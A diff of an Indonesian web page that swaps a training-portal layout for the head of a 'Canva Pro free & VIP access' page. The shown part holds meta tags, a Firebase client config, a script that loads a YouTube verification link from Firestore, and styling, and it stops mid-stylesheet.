@@ -1,291 +1,1097 @@
 <!doctype html>
-<html lang="id">
+<html lang="id" translate="no" class="notranslate">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta name="description" content="Portal materi dan catatan kelas pelatihan digital marketing BLK.">
-  <meta name="theme-color" content="#071128">
-  <link rel="icon" href="../logo-mujahiid.png">
-  <title>Portal Pelatihan Digital Marketing | Mujahiid</title>
-  <style>
-    :root{--navy:#071128;--navy2:#0d1b3b;--panel:#111f43;--purple:#755cf2;--purple2:#9a83ff;--cyan:#4ed9ea;--green:#2bc18a;--orange:#ff9a62;--ink:#17213d;--muted:#7d879d;--line:#e4e7ef;--paper:#f5f7fb;--red:#e35c70}*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;font-family:Inter,"Segoe UI",Arial,sans-serif;color:#eef1fc;background:var(--navy)}body.locked{overflow:hidden}button,input{font:inherit}button{cursor:pointer}button,a{-webkit-tap-highlight-color:transparent}a{color:inherit;text-decoration:none}.wrap{width:min(1180px,calc(100% - 48px));margin:auto}.shell{min-height:100vh;overflow:hidden;position:relative;background:radial-gradient(circle at 77% 9%,rgba(116,89,245,.16),transparent 31%),var(--navy)}.shell:before{content:"";position:absolute;inset:0;pointer-events:none;background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);background-size:55px 55px;mask-image:linear-gradient(#000,transparent 75%)}.orb{position:absolute;pointer-events:none;border-radius:50%;filter:blur(1px);animation:drift 10s ease-in-out infinite alternate}.orb.one{width:650px;height:650px;right:-260px;top:-310px;background:radial-gradient(circle,rgba(117,92,242,.24),transparent 68%)}.orb.two{width:470px;height:470px;left:-320px;top:650px;background:radial-gradient(circle,rgba(78,217,234,.09),transparent 69%);animation-delay:-4s}@keyframes drift{to{transform:translate3d(-24px,32px,0) scale(1.04)}}
-    header{min-height:82px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.09);position:relative;z-index:4}.brand{display:flex;align-items:center;gap:11px}.brand img{width:42px;height:42px;object-fit:contain;filter:drop-shadow(0 9px 18px rgba(115,89,245,.3))}.brand span{display:grid}.brand strong{font-size:13px;letter-spacing:.12em}.brand small{margin-top:3px;color:#77839e;font-size:8px}.main-nav{display:flex;gap:30px;color:#9da7bd;font-size:11px}.main-nav a{position:relative;padding:8px 0}.main-nav a:after{content:"";height:1px;position:absolute;left:0;right:100%;bottom:2px;background:var(--purple2);transition:.25s}.main-nav a:hover{color:#fff}.main-nav a:hover:after{right:0}.admin-link{padding:10px 13px;border:1px solid rgba(153,133,255,.45);border-radius:10px;color:#e8e4ff;background:rgba(116,89,245,.11);font-size:9px;font-weight:900;transition:.2s}.admin-link:hover{border-color:#9d87ff;transform:translateY(-2px);box-shadow:0 10px 24px rgba(81,61,191,.18)}
-    .hero{min-height:590px;padding:72px 0 65px;display:grid;grid-template-columns:1.08fr .92fr;gap:66px;align-items:center;position:relative;z-index:2}.live-pill{width:fit-content;display:flex;align-items:center;gap:8px;color:#aa9cff;font-size:8px;font-weight:900;letter-spacing:.18em}.live-pill i{width:7px;height:7px;border-radius:50%;background:var(--cyan);box-shadow:0 0 0 5px rgba(78,217,234,.08),0 0 16px var(--cyan);animation:pulse 2s ease-in-out infinite}@keyframes pulse{50%{box-shadow:0 0 0 9px rgba(78,217,234,0),0 0 20px var(--cyan)}}h1{margin:20px 0;font-size:clamp(44px,5.2vw,65px);line-height:1.065;letter-spacing:-.052em}h1 span{color:#9c85ff}.hero-copy>p{max-width:625px;margin:0;color:#a8b1c7;font-size:15px;line-height:1.82}.hero-actions{display:flex;gap:11px;margin-top:30px}.btn{min-height:45px;padding:0 18px;display:inline-flex;align-items:center;justify-content:center;gap:8px;border:0;border-radius:10px;font-size:10px;font-weight:900;transition:.22s}.btn-primary{color:#fff;background:linear-gradient(135deg,#7b60f5,#624bd7);box-shadow:0 14px 30px rgba(84,64,202,.28)}.btn-primary:hover{transform:translateY(-2px);box-shadow:0 18px 40px rgba(84,64,202,.36)}.btn-ghost{border:1px solid rgba(255,255,255,.13);color:#dce1ef;background:rgba(255,255,255,.04)}.btn-ghost:hover{border-color:rgba(255,255,255,.25);background:rgba(255,255,255,.07)}.trust{display:flex;flex-wrap:wrap;gap:18px;margin-top:31px;color:#8792aa;font-size:9px}.trust span:before{content:"✓";margin-right:6px;color:var(--cyan);font-weight:900}
-    .hero-panel{padding:24px;border:1px solid rgba(150,130,255,.23);border-radius:22px;background:linear-gradient(150deg,rgba(24,40,82,.94),rgba(9,20,47,.96));box-shadow:0 30px 80px rgba(0,0,0,.27),inset 0 1px rgba(255,255,255,.06);backdrop-filter:blur(16px)}.panel-head{padding-bottom:18px;display:flex;align-items:flex-start;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.08)}.panel-head p{margin:0 0 5px;color:#71809d;font-size:8px;font-weight:900;letter-spacing:.14em}.panel-head strong{font-size:16px}.status{display:flex;align-items:center;gap:6px;padding:6px 8px;border:1px solid rgba(43,193,138,.2);border-radius:99px;color:#72dfb6;background:rgba(43,193,138,.08);font-size:7px;font-weight:900}.status i{width:6px;height:6px;border-radius:50%;background:#45d59e}.summary-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:17px 0}.summary-stat{padding:14px 10px;display:grid;gap:7px;border:1px solid rgba(255,255,255,.07);border-radius:13px;background:rgba(255,255,255,.025)}.summary-stat b{width:31px;height:31px;display:grid;place-items:center;border-radius:9px;color:#b6aaff;background:rgba(116,89,245,.16);font-size:15px}.summary-stat:nth-child(2) b{color:#6fe1ed;background:rgba(78,217,234,.1)}.summary-stat:nth-child(3) b{color:#6ddcaf;background:rgba(43,193,138,.1)}.summary-stat small{color:#74809a;font-size:7px}.summary-stat strong{font-size:20px}.notice{padding:15px;display:flex;gap:11px;border:1px solid rgba(151,132,255,.16);border-radius:14px;background:linear-gradient(90deg,rgba(113,85,232,.13),rgba(67,207,225,.03))}.notice>b{width:32px;height:32px;display:grid;place-items:center;flex:0 0 auto;border-radius:9px;color:#b7abff;background:rgba(116,89,245,.17)}.notice small{color:#9183e8;font-size:7px;font-weight:900;letter-spacing:.13em}.notice p{margin:5px 0 0;color:#aeb6c9;font-size:9px;line-height:1.6}
-    .ribbon{position:relative;z-index:2;border-block:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.025)}.ribbon .wrap{min-height:82px;display:flex;align-items:center;gap:13px}.ribbon-icon{width:37px;height:37px;display:grid;place-items:center;flex:0 0 auto;border-radius:10px;color:#aa9eff;background:rgba(116,89,245,.14)}.ribbon p{flex:1;margin:0;color:#8f99b1;font-size:10px;line-height:1.65}.ribbon p strong{color:#edf0f8}.ribbon a{color:#aa9cff;font-size:8px;font-weight:900}
-    .modules{padding:82px 0 90px;position:relative;z-index:2}.section-head{display:flex;align-items:flex-end;justify-content:space-between;gap:28px}.eyebrow{margin:0;color:#8069ee;font-size:8px;font-weight:900;letter-spacing:.18em}.section-head h2{margin:7px 0 5px;font-size:34px;letter-spacing:-.035em}.section-head span{color:#818ca5;font-size:10px}.search{width:265px;height:41px;padding:0 12px;display:flex;align-items:center;gap:8px;border:1px solid rgba(255,255,255,.1);border-radius:10px;color:#69758f;background:rgba(255,255,255,.035);transition:.2s}.search:focus-within{border-color:rgba(147,126,255,.55);box-shadow:0 0 0 3px rgba(116,89,245,.08)}.search input{width:100%;border:0;outline:0;color:#fff;background:transparent;font-size:10px}.filters{margin:26px 0 23px;display:flex;flex-wrap:wrap;gap:7px}.filters button{padding:7px 12px;border:1px solid rgba(255,255,255,.09);border-radius:99px;color:#8b95aa;background:rgba(255,255,255,.025);font-size:8px;transition:.2s}.filters button:hover{color:#d7dcec;border-color:rgba(255,255,255,.18)}.filters button.active{border-color:rgba(139,118,255,.5);color:#fff;background:rgba(116,89,245,.18)}.module-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}.module-card{--accent:#755cf2;min-height:355px;padding:22px;display:flex;flex-direction:column;position:relative;overflow:hidden;border:1px solid rgba(255,255,255,.09);border-radius:18px;background:linear-gradient(155deg,rgba(255,255,255,.055),rgba(255,255,255,.018));transition:transform .3s,border-color .3s,box-shadow .3s}.module-card:before{content:"";width:170px;height:170px;position:absolute;right:-85px;top:-90px;border-radius:50%;background:radial-gradient(circle,color-mix(in srgb,var(--accent) 22%,transparent),transparent 69%);transition:.35s}.module-card:hover{border-color:color-mix(in srgb,var(--accent) 48%,transparent);transform:translateY(-6px);box-shadow:0 25px 55px rgba(0,0,0,.22)}.module-card:hover:before{transform:scale(1.25)}.module-top{display:flex;align-items:flex-start;justify-content:space-between;position:relative}.module-icon{width:48px;height:48px;display:grid;place-items:center;border-radius:13px;color:#fff;background:color-mix(in srgb,var(--accent) 22%,transparent);box-shadow:inset 0 0 0 1px color-mix(in srgb,var(--accent) 35%,transparent);font-size:21px}.module-number{color:#4f5b75;font-size:9px;font-weight:900;letter-spacing:.1em}.module-category{margin:21px 0 8px;color:color-mix(in srgb,var(--accent) 80%,#fff);font-size:7px;font-weight:900;letter-spacing:.11em;text-transform:uppercase}.module-card h3{margin:0;font-size:16px;line-height:1.4}.module-desc{margin:9px 0 15px;color:#7f8aa2;font-size:9px;line-height:1.65}.module-counts{display:flex;gap:7px}.count-pill{padding:6px 8px;border:1px solid rgba(255,255,255,.07);border-radius:7px;color:#8d97ae;background:rgba(255,255,255,.025);font-size:7px;font-weight:800}.preview-list{margin:15px 0 0;padding:13px 0 0;border-top:1px solid rgba(255,255,255,.07);display:grid;gap:8px}.preview-item{display:flex;align-items:center;gap:8px;color:#818ca5;font-size:8px}.preview-item i{width:5px;height:5px;border-radius:50%;background:var(--accent);box-shadow:0 0 9px var(--accent)}.module-open{min-height:39px;margin-top:auto;padding:0 12px;display:flex;align-items:center;justify-content:space-between;border:0;border-radius:9px;color:#ece9ff;background:color-mix(in srgb,var(--accent) 19%,transparent);font-size:9px;font-weight:900;transition:.22s}.module-open:hover{color:#fff;background:var(--accent)}.module-open b{transition:.2s}.module-open:hover b{transform:translateX(3px)}.empty{grid-column:1/-1;padding:72px 20px;border:1px dashed rgba(255,255,255,.13);border-radius:16px;color:#78839c;text-align:center;font-size:10px}
-    .flow{padding:72px 0;color:var(--ink);background:var(--paper)}.flow-box{padding:34px;display:grid;grid-template-columns:.8fr 1.7fr;gap:42px;align-items:center;border:1px solid #e3e6ee;border-radius:20px;background:linear-gradient(135deg,#fff,#f2f5ff);box-shadow:0 18px 45px rgba(33,45,78,.05)}.flow-box h2{margin:8px 0 0;font-size:26px;letter-spacing:-.03em}.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}.step{display:flex;align-items:center;gap:10px}.step b{width:38px;height:38px;display:grid;place-items:center;flex:0 0 auto;border-radius:10px;color:#745be1;background:#ebe7ff;font-size:9px}.step p{margin:0;display:grid;gap:3px;color:#7d869a;font-size:8px}.step strong{color:#222c48;font-size:10px}.page-footer{color:#8490a8;background:#071128}.page-footer .wrap{min-height:100px;display:flex;align-items:center;justify-content:space-between}.page-footer p{font-size:8px}.page-footer>a,.page-footer .wrap>a:last-child{color:#aea4ef;font-size:9px;font-weight:800}
-    .gate{position:fixed;z-index:130;inset:0;padding:20px;display:none;place-items:center;background:rgba(4,9,24,.9);backdrop-filter:blur(11px)}.gate.show{display:grid}.gate-card{width:min(510px,100%);padding:38px;text-align:center;border:1px solid rgba(148,127,255,.23);border-radius:22px;background:linear-gradient(150deg,#18284f,#0b1734);box-shadow:0 30px 90px rgba(0,0,0,.35);animation:modalIn .35s both}.gate-icon{width:58px;height:58px;margin:0 auto 20px;display:grid;place-items:center;border-radius:17px;color:#b5aaff;background:rgba(116,89,245,.17);font-size:24px}.gate-card h2{margin:8px 0 11px;font-size:27px}.gate-card>p{margin:0;color:#9fa9bf;font-size:10px;line-height:1.7}.password-row{margin-top:22px;display:flex;gap:8px}.password-row input{min-width:0;height:44px;flex:1;padding:0 12px;border:1px solid rgba(255,255,255,.12);outline:0;border-radius:9px;color:#fff;background:rgba(255,255,255,.05);font-size:10px}.password-row input:focus{border-color:#8d79ec}.password-row button{min-width:125px;border:0;border-radius:9px;color:#fff;background:#7259ef;font-size:9px;font-weight:900}.gate-error{min-height:16px;margin:7px 0 0!important;color:#ff9aa8!important;font-size:8px!important}
-    .module-modal{position:fixed;z-index:120;inset:0;padding:20px;display:none;place-items:center;background:rgba(4,9,23,.78);backdrop-filter:blur(9px)}.module-modal.show{display:grid}.module-dialog{width:min(820px,100%);max-height:calc(100vh - 40px);overflow:auto;border:1px solid rgba(255,255,255,.1);border-radius:22px;color:#eef1fb;background:#0d1935;box-shadow:0 35px 100px rgba(0,0,0,.42);animation:modalIn .32s both}@keyframes modalIn{from{opacity:0;transform:translateY(18px) scale(.975)}to{opacity:1;transform:none}}.dialog-head{padding:24px;display:flex;align-items:flex-start;gap:14px;border-bottom:1px solid rgba(255,255,255,.08);background:linear-gradient(120deg,rgba(116,89,245,.13),transparent)}.dialog-icon{width:50px;height:50px;display:grid;place-items:center;flex:0 0 auto;border-radius:14px;background:rgba(116,89,245,.17);font-size:22px}.dialog-title{min-width:0;flex:1}.dialog-title p{margin:0 0 5px;color:#9f90f4;font-size:7px;font-weight:900;letter-spacing:.12em;text-transform:uppercase}.dialog-title h2{margin:0;font-size:21px}.dialog-title span{display:block;margin-top:6px;color:#7e89a1;font-size:9px}.dialog-close{width:34px;height:34px;border:0;border-radius:9px;color:#8d97ad;background:rgba(255,255,255,.06);font-size:15px}.dialog-tabs{padding:13px 24px 0;display:flex;gap:7px;border-bottom:1px solid rgba(255,255,255,.08)}.dialog-tabs button{padding:10px 12px;border:0;border-bottom:2px solid transparent;color:#77839c;background:transparent;font-size:8px;font-weight:900}.dialog-tabs button.active{border-color:#8870f4;color:#fff}.dialog-body{padding:22px 24px 25px}.tab-panel{display:none}.tab-panel.active{display:block;animation:fadeIn .25s both}@keyframes fadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}.file-list,.note-list{display:grid;gap:9px}.file-row{min-height:68px;padding:11px 12px;display:flex;align-items:center;gap:11px;border:1px solid rgba(255,255,255,.075);border-radius:11px;background:rgba(255,255,255,.025);transition:.2s}.file-row:hover{border-color:rgba(139,118,255,.35);background:rgba(255,255,255,.04)}.file-format{width:39px;height:39px;display:grid;place-items:center;flex:0 0 auto;border-radius:10px;color:#b5a8ff;background:rgba(116,89,245,.16);font-size:7px;font-weight:900}.file-copy{min-width:0;flex:1}.file-copy strong{display:block;font-size:10px}.file-copy p{margin:4px 0 0;color:#74809a;font-size:8px;line-height:1.45}.file-download{padding:9px 11px;border-radius:8px;color:#ddd8ff;background:rgba(116,89,245,.16);font-size:8px;font-weight:900;white-space:nowrap}.file-download:hover{color:#fff;background:#7057ec}.note-item{padding:15px;border:1px solid rgba(255,255,255,.075);border-radius:11px;background:rgba(255,255,255,.025)}.note-head{margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:12px}.note-item h4{margin:0;font-size:10px}.note-item p{margin:0;white-space:pre-wrap;color:#8490a7;font-size:9px;line-height:1.7}.copy-note{flex:0 0 auto;padding:7px 10px;border:1px solid rgba(139,118,255,.28);border-radius:8px;color:#d7d1ff;background:rgba(116,89,245,.13);font-size:7px;font-weight:900;white-space:nowrap;transition:.2s}.copy-note:hover{border-color:rgba(139,118,255,.55);color:#fff;background:rgba(116,89,245,.24)}.copy-note.copied{color:#bff5dc;border-color:rgba(49,198,132,.35);background:rgba(49,198,132,.13)}.list-empty{padding:45px 20px;border:1px dashed rgba(255,255,255,.12);border-radius:11px;color:#748099;text-align:center;font-size:9px}.toast{position:fixed;z-index:180;right:20px;bottom:20px;padding:12px 15px;border-radius:9px;color:#fff;background:#1c9e6d;box-shadow:0 12px 35px rgba(0,0,0,.22);font-size:8px;font-weight:900;transform:translateY(80px);opacity:0;transition:.25s}.toast.show{transform:none;opacity:1}.toast.error{background:#d95163}.loading{position:fixed;z-index:160;inset:0;display:grid;place-items:center;align-content:center;gap:13px;background:var(--navy);transition:.45s}.loading.hide{opacity:0;visibility:hidden}.loading img{width:68px}.loader{width:180px;height:4px;overflow:hidden;border-radius:99px;background:rgba(255,255,255,.08)}.loader i{display:block;width:45%;height:100%;border-radius:99px;background:#765fed;animation:load 1.1s infinite alternate}@keyframes load{to{transform:translateX(120px)}}
-    .hero-copy>*{opacity:0;transform:translateY(17px)}body.ready .hero-copy>*{animation:rise .65s cubic-bezier(.2,.75,.3,1) forwards}body.ready .hero-copy>*:nth-child(2){animation-delay:.08s}body.ready .hero-copy>*:nth-child(3){animation-delay:.16s}body.ready .hero-copy>*:nth-child(4){animation-delay:.24s}body.ready .hero-copy>*:nth-child(5){animation-delay:.32s}.hero-panel{opacity:0;transform:translateX(22px)}body.ready .hero-panel{animation:panelIn .75s .18s cubic-bezier(.2,.75,.3,1) forwards}@keyframes rise{to{opacity:1;transform:none}}@keyframes panelIn{to{opacity:1;transform:none}}.reveal{opacity:0;transform:translateY(24px);transition:opacity .65s ease,transform .65s cubic-bezier(.2,.75,.3,1)}.reveal.visible{opacity:1;transform:none}.module-card.reveal{transition-delay:var(--delay,0ms)}
-    @media(max-width:980px){.hero{grid-template-columns:1fr;gap:40px}.hero-panel{max-width:650px}.module-grid{grid-template-columns:repeat(2,1fr)}.flow-box{grid-template-columns:1fr}.section-head{align-items:flex-start;flex-direction:column}.search{width:100%}}@media(max-width:680px){.wrap{width:calc(100% - 24px)}header{min-height:72px}.main-nav{display:none}.brand small{display:none}.hero{min-height:auto;padding:47px 0 52px}.hero h1{font-size:39px}.hero-actions{flex-direction:column}.summary-grid{grid-template-columns:1fr 1fr}.summary-stat:last-child{grid-column:1/-1}.ribbon .wrap{padding:18px 0;flex-wrap:wrap}.ribbon a{margin-left:50px}.modules{padding:60px 0}.module-grid,.steps{grid-template-columns:1fr}.flow{padding:55px 0}.flow-box{padding:24px}.page-footer .wrap{padding:24px 0;flex-direction:column;gap:12px;text-align:center}.module-modal{padding:8px}.module-dialog{max-height:calc(100vh - 16px)}.dialog-head{padding:18px}.dialog-tabs{padding-inline:18px}.dialog-body{padding:18px}.file-row{align-items:flex-start;flex-wrap:wrap}.file-copy{min-width:calc(100% - 55px)}.file-download{width:100%;text-align:center}.gate-card{padding:28px 21px}.password-row{flex-direction:column}.password-row button{min-height:43px}}
-    @media(prefers-reduced-motion:reduce){*,*:before,*:after{scroll-behavior:auto!important;animation:none!important;transition:none!important}.hero-copy>*,.hero-panel,.reveal{opacity:1!important;transform:none!important}}
-  </style>
+  <meta name="google" content="notranslate">
+  <meta name="googlebot" content="notranslate">
+  <meta http-equiv="Content-Language" content="id">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#0b0c10">
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+      <link rel="stylesheet" href="/theme.css?v=20260808">
+    <script src="/ai-web-config.js?v=20260808"></script>
+    <script src="/theme.js?v=20260808"></script>
+    <script type="module">
+      import { initializeApp, getApps } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+      import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-  <style id="photo-example-feature-styles">
-    .dialog-tabs button.hidden-tab{display:none!important}.photo-gallery{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.photo-card{overflow:hidden;border:1px solid rgba(255,255,255,.08);border-radius:13px;background:rgba(255,255,255,.025)}.photo-frame{height:230px;position:relative;overflow:hidden;background:#08142d;cursor:zoom-in}.photo-frame img{width:100%;height:100%;display:block;object-fit:contain;pointer-events:none;-webkit-user-drag:none;user-select:none}.photo-frame:after{content:"PRATINJAU • HANYA LIHAT";position:absolute;right:8px;bottom:8px;padding:5px 7px;border-radius:6px;color:#dcd8f5;background:rgba(5,11,27,.72);backdrop-filter:blur(5px);font-size:6px;font-weight:900;letter-spacing:.07em}.photo-copy{padding:12px 13px}.photo-copy strong{display:block;font-size:10px}.photo-copy p{margin:5px 0 0;color:#7e8aa2;font-size:8px;line-height:1.6}.photo-notice{margin-bottom:12px;padding:10px 12px;border:1px solid rgba(139,118,255,.18);border-radius:10px;color:#8e99b0;background:rgba(116,89,245,.06);font-size:11px;line-height:1.6}.photo-viewer{position:fixed;z-index:190;inset:0;padding:20px;display:none;place-items:center;background:rgba(3,8,20,.94);backdrop-filter:blur(10px)}.photo-viewer.show{display:grid}.photo-viewer-card{width:min(980px,100%);max-height:calc(100vh - 40px);display:grid;grid-template-rows:auto minmax(0,1fr);overflow:hidden;border:1px solid rgba(255,255,255,.11);border-radius:18px;background:#0c1731}.photo-viewer-head{min-height:58px;padding:11px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(255,255,255,.08)}.photo-viewer-head div{min-width:0;flex:1}.photo-viewer-head strong{display:block;font-size:10px}.photo-viewer-head small{display:block;margin-top:3px;color:#7f8aa2;font-size:8px}.photo-viewer-head button{width:34px;height:34px;border:0;border-radius:8px;color:#a0a9bc;background:rgba(255,255,255,.07)}.photo-viewer-image{min-height:0;padding:14px;display:grid;place-items:center;overflow:auto}.photo-viewer-image img{max-width:100%;max-height:calc(100vh - 125px);display:block;pointer-events:none;-webkit-user-drag:none;user-select:none}.module-counts:empty,.preview-list:empty{display:none}
-    @media(max-width:650px){.photo-gallery{grid-template-columns:1fr}.photo-frame{height:210px}}
+      const firebaseConfig = {
+        apiKey: "AIzaSyAcN0uaLfWmxp3ZBbWIomPXHenx3gjr5-w",
+        authDomain: "akses-canva-pro-terbatas.firebaseapp.com",
+        databaseURL: "https://akses-canva-pro-terbatas-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "akses-canva-pro-terbatas",
+        storageBucket: "akses-canva-pro-terbatas.firebasestorage.app",
+        messagingSenderId: "424693923668",
+        appId: "1:424693923668:web:ab4cc45f700a36699c12c1"
+      };
+
+      const DEFAULT_YOUTUBE_VERIFIKASI_LINK = "https://youtu.be/jjqptkhjkx4";
+
+      function normalizeYoutubeVerifikasiLink(link) {
+        const value = typeof link === 'string' ? link.trim() : '';
+        if (!value) return DEFAULT_YOUTUBE_VERIFIKASI_LINK;
+
+        try {
+          const url = new URL(value, window.location.origin);
+          if (!['http:', 'https:'].includes(url.protocol)) return DEFAULT_YOUTUBE_VERIFIKASI_LINK;
+          return url.href;
+        } catch (error) {
+          return DEFAULT_YOUTUBE_VERIFIKASI_LINK;
+        }
+      }
+
+      function applyYoutubeVerifikasiLink(link) {
+        const finalLink = normalizeYoutubeVerifikasiLink(link);
+        document.querySelectorAll('[data-youtube-verifikasi-link]').forEach(anchor => {
+          anchor.href = finalLink;
+          anchor.target = '_blank';
+          anchor.rel = 'noopener';
+        });
+      }
+
+      window.addEventListener('DOMContentLoaded', async () => {
+        applyYoutubeVerifikasiLink(DEFAULT_YOUTUBE_VERIFIKASI_LINK);
+
+        try {
+          const app = getApps().length ? getApps()[0] : initializeApp(firebaseConfig);
+          const db = getFirestore(app);
+          const snap = await getDoc(doc(db, "admin_config", "settings"));
+
+          if (snap.exists()) {
+            applyYoutubeVerifikasiLink(snap.data().youtubeLink);
+          }
+        } catch (error) {
+          console.warn('Gagal memuat Link YouTube Verifikasi dari admin-verifikasi:', error);
+        }
+      });
+    </script>
+    <link rel="icon" type="image/png" href="logo-mujahiid.png">
+  <title>Canva Pro — Akses Gratis & VIP</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com?v=20260808">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@500;700;800&family=DM+Sans:wght@400;500;700&display=swap&v=20260808" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #08090d;
+      --bg-2: #0d1018;
+      --surface: rgba(18, 21, 31, .72);
+      --surface-strong: rgba(21, 24, 36, .9);
+      --border: rgba(255, 255, 255, .12);
+      --border-strong: rgba(255, 255, 255, .22);
+      --text: #f8fafc;
+      --muted: #a7adbd;
+      --muted-2: #777f92;
+      --gold: #f7b735;
+      --gold-soft: rgba(247, 183, 53, .14);
+      --green: #22d4a0;
+      --green-soft: rgba(34, 212, 160, .14);
+      --blue: #5e9bff;
+      --blue-soft: rgba(94, 155, 255, .16);
+      --danger: #ff6b8a;
+      --radius: 28px;
+      --shadow: 0 28px 70px rgba(0, 0, 0, .48);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      min-height: 100%;
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "DM Sans", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 10% 0%, rgba(94, 155, 255, .28), transparent 34rem),
+        radial-gradient(circle at 90% 12%, rgba(247, 183, 53, .22), transparent 30rem),
+        radial-gradient(circle at 50% 100%, rgba(34, 212, 160, .16), transparent 28rem),
+        linear-gradient(145deg, var(--bg), var(--bg-2) 55%, #06070a);
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      z-index: -3;
+      background-image:
+        linear-gradient(rgba(255, 255, 255, .035) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, .035) 1px, transparent 1px);
+      background-size: 44px 44px;
+      mask-image: linear-gradient(to bottom, rgba(0,0,0,.8), transparent 78%);
+      pointer-events: none;
+    }
+
+    .aurora {
+      position: fixed;
+      inset: -28vh -18vw auto;
+      height: 70vh;
+      z-index: -2;
+      background:
+        radial-gradient(circle at 22% 40%, rgba(94,155,255,.42), transparent 24%),
+        radial-gradient(circle at 52% 28%, rgba(247,183,53,.28), transparent 22%),
+        radial-gradient(circle at 78% 48%, rgba(34,212,160,.24), transparent 25%);
+      filter: blur(45px);
+      opacity: .72;
+      animation: auroraMove 12s ease-in-out infinite alternate;
+      pointer-events: none;
+    }
+
+    @keyframes auroraMove {
+      from { transform: translate3d(-2%, -1%, 0) rotate(-2deg) scale(1); }
+      to { transform: translate3d(2%, 4%, 0) rotate(3deg) scale(1.08); }
+    }
+
+    .page {
+      width: min(1120px, calc(100% - 28px));
+      margin: 0 auto;
+      padding: 22px 0 48px;
+    }
+
+    .shell {
+      position: relative;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      border-radius: calc(var(--radius) + 8px);
+      background: linear-gradient(155deg, rgba(255,255,255,.11), rgba(255,255,255,.045) 38%, rgba(255,255,255,.025));
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(22px);
+      -webkit-backdrop-filter: blur(22px);
+    }
+
+    .shell::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(120deg, rgba(255,255,255,.16), transparent 28%),
+        radial-gradient(circle at top right, rgba(247,183,53,.16), transparent 26rem);
+      pointer-events: none;
+    }
+
+    .nav {
+      position: sticky;
+      top: 10px;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      margin: 0 0 16px;
+      padding: 12px;
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      background: rgb(8 9 13 / 41%);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      box-shadow: 0 16px 36px rgba(0,0,0,.28);
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      gap: 11px;
+      min-width: 0;
+      color: var(--text);
+      text-decoration: none;
+    }
+
+    .brand-mark {
+      display: grid;
+      place-items: center;
+      width: 50px;
+      height: 50px;
+      border-radius: 16px;
+      box-shadow: 0 12px 26px rgba(0,0,0,.24);
+      overflow: hidden;
+      flex: 0 0 auto;
+    }
+
+    .brand-mark img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .brand-text {
+      display: grid;
+      gap: 2px;
+      min-width: 0;
+    }
+
+    .brand-title {
+      font-family:  sans-serif;
+      font-weight: 800;
+      letter-spacing: 2px;
+      line-height: 1;
+      white-space: nowrap;
+    }
+
+    .brand-subtitle {
+      color: var(--muted);
+      font-size: 12px;
+      white-space: nowrap;
+    }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .tiny-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      border: 1px solid rgba(247,183,53,.24);
+      background: rgba(247,183,53,.1);
+      color: #ffe0a0;
+      border-radius: 999px;
+      padding: 9px 12px;
+      font-size: 12px;
+      font-weight: 700;
+      white-space: nowrap;
+    }
+
+    .hero {
+      position: relative;
+      display: grid;
+      grid-template-columns: 1fr;
+      align-items: center;
+      gap: 18px;
+      padding: clamp(22px, 4vw, 46px);
+    }
+
+    .hero-copy {
+      position: relative;
+      z-index: 1;
+      animation: fadeUp .65s ease both;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      width: fit-content;
+      margin-bottom: 16px;
+      padding: 8px 12px;
+      border: 1px solid rgba(94,155,255,.24);
+      border-radius: 999px;
+      background: rgba(94,155,255,.11);
+      color: #cfe0ff;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .eyebrow-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 0 0 6px rgba(34,212,160,.12);
+    }
+
+    h1 {
+      margin: 0;
+      font-family: "Syne", sans-serif;
+      font-size: clamp(1.75rem, 5.4vw, 3.65rem);
+      line-height: .96;
